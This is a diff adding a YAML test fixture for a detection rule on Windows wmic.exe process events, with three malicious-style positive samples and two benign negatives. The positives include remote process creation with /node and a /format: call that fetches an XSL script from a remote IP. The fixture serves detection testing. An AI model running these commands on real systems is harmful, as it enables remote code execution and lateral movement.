@@ -1,0 +1,46 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: wmic.exe, executable: 'C:\Windows\System32\wmic.exe', command_line: wmic process call create "cmd /c
+        calc"}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: wmic.exe, executable: 'C:\Windows\System32\wmic.exe', command_line: 'wmic /node:srv2 process call create
+        "cmd"'}
+- id: pos3
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: wmic.exe, executable: 'C:\Windows\System32\wmic.exe', command_line: 'wmic os get /format:"http://203.0.113.9/a.xsl"'}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: wmic.exe, executable: 'C:\Windows\System32\wmic.exe', command_line: wmic os get caption}
+- id: neg2
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: wmic.exe, executable: 'C:\Windows\System32\wmic.exe', command_line: wmic logicaldisk get size}
